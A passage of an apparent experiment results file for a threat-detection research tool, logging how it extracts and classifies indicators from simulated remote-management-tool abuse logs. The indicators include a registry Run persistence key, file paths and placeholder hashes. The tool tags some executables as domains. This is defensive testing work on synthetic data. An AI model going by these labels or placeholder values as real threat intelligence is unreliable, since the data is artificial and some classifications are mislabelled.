{
  "experiment_metadata": {
    "start_time": "2025-08-18T19:48:53.748632",
    "end_time": "2025-08-18T20:15:08.896818",
    "total_tests": 21,
    "afretip_version": "1.0.0",
    "configuration": "config/config-dev.yaml"
  },
  "baseline_metrics": {
    "timestamp": "2025-08-18T19:48:53.754290",
    "system_resources": {
      "cpu_cores": "Unknown",
      "memory_gb": "Unknown",
      "platform": "Unknown",
      "error": "module 'psutil' has no attribute 'platform'"
    },
    "memory_usage": {
      "rss_mb": 25.89,
      "vms_mb": 47.05,
      "percent": 0.16,
      "available_mb": 4567.24
    },
    "cpu_usage": {
      "total_percent": 9.5,
      "per_core_percent": [
        3.1,
        4.0,
        3.1,
        3.1,
        2.0,
        8.1,
        6.1,
        3.0
      ],
      "load_average": [
        1.4638671875,
        1.61328125,
        1.30712890625
      ]
    },
    "disk_usage": {
      "total_gb": 231.61,
      "used_gb": 60.65,
      "free_gb": 159.12,
      "percent_used": 26.19
    },
    "wazuh_rules": {
      "existing_rule_count": 0,
      "rules_directory_exists": false
    },
    "ioc_database": {
      "total_iocs": 13,
      "database_exists": true,
      "database_size_mb": 0.03,
      "iocs_by_type": {
        "domain": 3,
        "file_path": 2,
        "hash_md5": 2,
        "hash_sha1": 1,
        "ip": 3,
        "url": 2
      },
      "iocs_by_source": {
        "manual": 13
      }
    },
    "process_info": {
      "pid": 356869,
      "python_executable": "/home/moda/Documents/MICAC/Semester 2/Research Project/git/afretip/.venv/bin/python",
      "working_directory": "/home/moda/Documents/MICAC/Semester 2/Research Project/git/afretip"
    }
  },
  "test_results": [
    {
      "test_file": "rmm_02_service_persistence.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T19:49:11.158704",
      "processing_time": 15.389985799789429,
      "success": true,
      "metrics": {
        "iocs_extracted": 2,
        "findings_generated": 0,
        "rules_generated": 0,
        "ioc_extraction_time": 15.025,
        "threat_classifications": {},
        "confidence_scores": [],
        "threat_levels": {},
        "rule_generation_efficiency": 0.0
      },
      "memory_delta_mb": 0.120000000000001,
      "peak_memory_mb": 26.73,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:48:56 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/rmm_abuse/rmm_02_service_persistence.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:48:56 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:48:56 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:48:56 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:48:56 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:48:56 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:48:56 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:48:56 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:48:56 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:48:56 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:48:56 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:48:56 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:48:56 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:48:56 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:48:56 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:48:56 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:48:56 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:48:56 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:48:56 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:48:56 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:48:56 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:48:56 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:48:56 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:48:56 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:48:56 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:48:56 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:48:56 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:48:56 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:48:56 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_194856\n2025-08-18 19:48:56 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:48:56 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:48:56 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.009s iocs_found=2 log_hash=5d5aeafbaafd4ac08e592c7d08096e9c\n2025-08-18 19:48:56 [debug    ] VirusTotal rate limiting       sleep_time=14.25337266921997\n2025-08-18 19:49:11 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 2\n  \u2022 Findings generated: 0\n  \u2022 Rules generated: 0\n  \u2022 Processing time: 15.025s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.DOMAIN: rmmclient.exe (confidence: 0.50)\n  \u2022 IOCType.FILE_PATH: C:\\\\ProgramData\\\\RMMClient\\\\rmmclient.exe (confidence: 0.50)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "rmm_04_registry_persistence.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T19:50:11.570237",
      "processing_time": 60.41109561920166,
      "success": true,
      "metrics": {
        "iocs_extracted": 5,
        "findings_generated": 0,
        "rules_generated": 0,
        "ioc_extraction_time": 60.052,
        "threat_classifications": {},
        "confidence_scores": [],
        "threat_levels": {},
        "rule_generation_efficiency": 0.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.73,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:49:11 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/rmm_abuse/rmm_04_registry_persistence.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:49:11 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:49:11 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:49:11 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:49:11 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:49:11 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:49:11 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:49:11 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:49:11 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:49:11 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:49:11 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:49:11 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:49:11 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:49:11 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:49:11 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:49:11 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:49:11 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:49:11 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:49:11 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:49:11 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:49:11 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:49:11 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:49:11 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:49:11 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:49:11 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:49:11 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:49:11 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:49:11 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:49:11 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_194911\n2025-08-18 19:49:11 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:49:11 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:49:11 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=5 log_hash=c29d69d0200c4b18b931986c4c32715d\n2025-08-18 19:49:12 [debug    ] VirusTotal rate limiting       sleep_time=13.832490682601929\n2025-08-18 19:49:27 [debug    ] VirusTotal rate limiting       sleep_time=13.775859355926514\n2025-08-18 19:49:41 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:49:41 [debug    ] VirusTotal rate limiting       sleep_time=14.998555421829224\n2025-08-18 19:49:56 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:49:56 [debug    ] VirusTotal rate limiting       sleep_time=14.99846363067627\n2025-08-18 19:50:11 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.REGISTRY_KEY: 'registry_key'>\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 5\n  \u2022 Findings generated: 0\n  \u2022 Rules generated: 0\n  \u2022 Processing time: 60.052s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.DOMAIN: rmmclient.exe (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: reg.exe (confidence: 0.50)\n  \u2022 IOCType.FILE_PATH: C:\\\\ProgramData\\\\RMMClient\\\\rmmclient.exe (confidence: 0.50)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\reg.exe (confidence: 0.50)\n  \u2022 IOCType.REGISTRY_KEY: HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\RMMClient (confidence: 0.50)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "rmm_03_scheduled_task.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T19:51:26.999527",
      "processing_time": 75.42885255813599,
      "success": true,
      "metrics": {
        "iocs_extracted": 6,
        "findings_generated": 7,
        "rules_generated": 7,
        "ioc_extraction_time": 75.076,
        "threat_classifications": {
          "suspicious": 6
        },
        "confidence_scores": [
          0.7,
          0.7,
          0.7,
          0.8500000000000001,
          0.8500000000000001,
          0.7
        ],
        "threat_levels": {
          "medium": 6
        },
        "rule_generation_efficiency": 1.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.73,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:50:11 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/rmm_abuse/rmm_03_scheduled_task.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:50:11 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:50:11 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:50:11 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:50:11 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:50:11 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:50:11 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:50:11 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:50:11 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:50:11 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:50:11 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:50:11 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:50:11 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:50:11 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:50:11 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:50:11 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:50:11 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:50:11 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:50:11 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:50:11 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:50:11 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:50:11 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:50:11 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:50:11 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:50:11 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:50:11 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:50:11 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:50:11 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:50:11 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_195011\n2025-08-18 19:50:11 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:50:11 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:50:11 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=6 log_hash=a57d42c283a547f481115468e78f8ba3\n2025-08-18 19:50:12 [info     ] Threat detected                classification=suspicious confidence=0.7 ioc_type=domain ioc_value=powershell.exe threat_level=medium\n2025-08-18 19:50:12 [debug    ] VirusTotal rate limiting       sleep_time=14.131037473678589\n2025-08-18 19:50:27 [info     ] Threat detected                classification=suspicious confidence=0.7 ioc_type=domain ioc_value=schtasks.exe threat_level=medium\n2025-08-18 19:50:27 [debug    ] VirusTotal rate limiting       sleep_time=14.197025537490845\n2025-08-18 19:50:42 [info     ] Threat detected                classification=suspicious confidence=0.7 ioc_type=domain ioc_value=rmmclient.exe threat_level=medium\n2025-08-18 19:50:42 [debug    ] VirusTotal rate limiting       sleep_time=14.261913537979126\n2025-08-18 19:50:56 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:50:56 [info     ] Threat detected                classification=suspicious confidence=0.8500000000000001 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\schtasks.exe threat_level=medium\n2025-08-18 19:50:56 [debug    ] VirusTotal rate limiting       sleep_time=14.99826431274414\n2025-08-18 19:51:11 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:51:11 [info     ] Threat detected                classification=suspicious confidence=0.8500000000000001 ioc_type=file_path ioc_value=C:\\\\ProgramData\\\\RMMClient\\\\rmmclient.exe threat_level=medium\n2025-08-18 19:51:11 [debug    ] VirusTotal rate limiting       sleep_time=14.999470472335815\n2025-08-18 19:51:26 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 19:51:26 [info     ] Threat detected                classification=suspicious confidence=0.7 ioc_type=process_name ioc_value=powershell.exe threat_level=medium\n2025-08-18 19:51:26 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=80c174924705400eba1dd790659d7ae0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:51:26 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=682fdd31309e4f839caa42db409fb59f new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:51:26 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=95fbe9e76a2a44f0bbf74574dca76057 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:51:26 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=6359389950ea4b4fa30d484690a63f19 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:51:26 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=e59a16bca28f4a95809c59684b88080f new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:51:26 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=6b421001feff43faa73575d6308bfdc0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:51:26 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=20aaabc03d2f493ba79dd2e9f946fcd7 new_rules_generated=1 total_iocs=6 uncovered_iocs=6\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 6\n  \u2022 Findings generated: 7\n  \u2022 Rules generated: 7\n  \u2022 Processing time: 75.076s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.DOMAIN: powershell.exe (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: schtasks.exe (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: rmmclient.exe (confidence: 0.50)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\schtasks.exe (confidence: 0.50)\n  \u2022 IOCType.FILE_PATH: C:\\\\ProgramData\\\\RMMClient\\\\rmmclient.exe (confidence: 0.50)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "rmm_01_encoded_powershell.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T19:52:57.441000",
      "processing_time": 90.44093656539917,
      "success": true,
      "metrics": {
        "iocs_extracted": 7,
        "findings_generated": 8,
        "rules_generated": 8,
        "ioc_extraction_time": 90.083,
        "threat_classifications": {
          "suspicious": 5,
          "malicious": 2
        },
        "confidence_scores": [
          0.7,
          0.7,
          1.0,
          1.0,
          0.8500000000000001,
          0.8500000000000001,
          0.7
        ],
        "threat_levels": {
          "medium": 5,
          "high": 2
        },
        "rule_generation_efficiency": 1.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.73,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:51:27 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/rmm_abuse/rmm_01_encoded_powershell.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:51:27 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:51:27 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:51:27 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:51:27 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:51:27 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:51:27 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:51:27 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:51:27 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:51:27 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:51:27 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:51:27 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:51:27 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:51:27 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:51:27 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:51:27 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:51:27 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:51:27 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:51:27 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:51:27 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:51:27 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:51:27 [info     ] Threat detector initialized    confidence_threshold=0.6 novelty_detection=True novelty_threshold=0.7 pattern_detection=True\n2025-08-18 19:51:27 [info     ] Parsing existing rules from: /var/ossec/etc/rules\n2025-08-18 19:51:27 [warning  ] Rules directory not found: /var/ossec/etc/rules\n2025-08-18 19:51:27 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:51:27 [info     ] Parsing existing rules from: data/rules\n2025-08-18 19:51:27 [info     ] Parsed 0 existing rules, IOC coverage for 0 IOCs\n2025-08-18 19:51:27 [info     ] Initialized rule generator with existing rule checking\n2025-08-18 19:51:27 [info     ] Analytics metrics initialized  output_dir=data/analytics session_id=20250818_195127\n2025-08-18 19:51:27 [info     ] Analytics metrics enabled for data collection\n2025-08-18 19:51:27 [info     ] Processing engine initialized\n\u2699\ufe0f Processing sample log...\n2025-08-18 19:51:27 [debug    ] Enhanced IOC extraction completed context=unknown extraction_time=0.001s iocs_found=7 log_hash=61846bf2249d4e8399ca92be35f0910a\n2025-08-18 19:51:28 [info     ] Threat detected                classification=suspicious confidence=0.7 ioc_type=domain ioc_value=powershell.exe threat_level=medium\n2025-08-18 19:51:28 [debug    ] VirusTotal rate limiting       sleep_time=13.579598903656006\n2025-08-18 19:51:43 [info     ] Threat detected                classification=suspicious confidence=0.7 ioc_type=domain ioc_value=rmmclient.exe threat_level=medium\n2025-08-18 19:51:43 [debug    ] VirusTotal rate limiting       sleep_time=13.647834777832031\n2025-08-18 19:51:58 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=hash_md5 ioc_value=A1B2C3D4E5F6789012345678901234AB threat_level=high\n2025-08-18 19:51:58 [debug    ] VirusTotal rate limiting       sleep_time=13.738147974014282\n2025-08-18 19:52:13 [info     ] Threat detected                classification=malicious confidence=1.0 ioc_type=hash_sha256 ioc_value=1A2B3C4D5E6F7890123456789012345678901234567890123456789012345678 threat_level=high\n2025-08-18 19:52:13 [debug    ] VirusTotal rate limiting       sleep_time=13.726005554199219\n2025-08-18 19:52:27 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:52:27 [info     ] Threat detected                classification=suspicious confidence=0.8500000000000001 ioc_type=file_path ioc_value=C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe threat_level=medium\n2025-08-18 19:52:27 [debug    ] VirusTotal rate limiting       sleep_time=14.998046636581421\n2025-08-18 19:52:42 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.FILE_PATH: 'file_path'>\n2025-08-18 19:52:42 [info     ] Threat detected                classification=suspicious confidence=0.8500000000000001 ioc_type=file_path ioc_value=C:\\\\ProgramData\\\\RMMClient\\\\rmmclient.exe threat_level=medium\n2025-08-18 19:52:42 [debug    ] VirusTotal rate limiting       sleep_time=14.997872352600098\n2025-08-18 19:52:57 [debug    ] IOC type not supported by VirusTotal ioc_type=<IOCType.PROCESS_NAME: 'process_name'>\n2025-08-18 19:52:57 [info     ] Threat detected                classification=suspicious confidence=0.7 ioc_type=process_name ioc_value=powershell.exe threat_level=medium\n2025-08-18 19:52:57 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=dd96666d67294834a33868cfa7e65eee new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:52:57 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=c9e419cec4aa406587712b6a0119a7e0 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:52:57 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=f6da8c70d8c24800aec3b24c778c428b new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:52:57 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=31688a8bccb242d9bc71f9826c1b0159 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:52:57 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=871fda29f93a4f68ba2a331e4d4a4c52 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:52:57 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=122504751b044cbdbf641980a8b5953c new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:52:57 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=afdd0d579dad44ed9e76a4f14ee78ea2 new_rules_generated=1 total_iocs=1 uncovered_iocs=1\n2025-08-18 19:52:57 [info     ] Generated rules with deduplication covered_by_existing=0 finding_id=0f1f2981eabd4891b3cd957d00432b81 new_rules_generated=1 total_iocs=7 uncovered_iocs=7\n\n\ud83d\udcca Sample Log Processing Results:\n  \u2022 IOCs extracted: 7\n  \u2022 Findings generated: 8\n  \u2022 Rules generated: 8\n  \u2022 Processing time: 90.083s\n\n\ud83d\udd0d Extracted IOCs (showing first 5):\n  \u2022 IOCType.DOMAIN: powershell.exe (confidence: 0.50)\n  \u2022 IOCType.DOMAIN: rmmclient.exe (confidence: 0.50)\n  \u2022 IOCType.HASH_MD5: A1B2C3D4E5F6789012345678901234AB (confidence: 0.90)\n  \u2022 IOCType.HASH_SHA256: 1A2B3C4D5E6F7890123456789012345678901234567890123456789012345678 (confidence: 0.90)\n  \u2022 IOCType.FILE_PATH: C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe (confidence: 0.50)\n\n\ud83c\udf89 Dry run successful!\n\u2705 The pipeline should work correctly with this configuration\n",
      "errors": ""
    },
    {
      "test_file": "rmm_05_network_beaconing.json",
      "test_category": "malicious",
      "timestamp": "2025-08-18T19:53:42.840207",
      "processing_time": 45.39878869056702,
      "success": true,
      "metrics": {
        "iocs_extracted": 4,
        "findings_generated": 1,
        "rules_generated": 1,
        "ioc_extraction_time": 45.028,
        "threat_classifications": {
          "suspicious": 1
        },
        "confidence_scores": [
          0.65
        ],
        "threat_levels": {
          "medium": 1
        },
        "rule_generation_efficiency": 1.0
      },
      "memory_delta_mb": 0.0,
      "peak_memory_mb": 26.73,
      "raw_output": "\ud83e\uddea Performing AFRETIP Dry Run\n\ud83d\udcc1 Using configuration: config/config-dev.yaml\n2025-08-18 19:52:57 [info     ] Configuration loaded successfully path=config/config-dev.yaml sections=['wazuh', 'processing', 'extraction', 'storage', 'analytics', 'deployment', 'logging', 'reputation_services', 'threat_intelligence', 'hybrid_classification', 'whitelist', 'rule_generation', 'monitoring', 'performance', 'development']\n\u2705 Configuration structure validated\n\ud83d\udcc4 Processing sample log: experiments/malicious/rmm_abuse/rmm_05_network_beaconing.json\n\ud83d\udd27 Initializing processing engine...\n2025-08-18 19:52:57 [info     ] Enhanced IOC Extractor initialized confidence_threshold=0.3 context_filtering=True\n2025-08-18 19:52:57 [info     ] Threat intelligence database schema initialized\n2025-08-18 19:52:57 [info     ] Threat intel database already populated ioc_count=13\n2025-08-18 19:52:57 [info     ] Threat intelligence database initialized db_path=./data/threat_intelligence.db\n2025-08-18 19:52:57 [info     ] Reputation services initialized services=['VirusTotal', 'AbuseIPDB']\n2025-08-18 19:52:57 [info     ] Custom whitelist disabled - using built-in defaults only\n2025-08-18 19:52:57 [info     ] IOC Classifier initialized with hybrid detection whitelist_domains=13 whitelist_ips=5 whitelist_processes=0\n2025-08-18 19:52:57 [info     ] 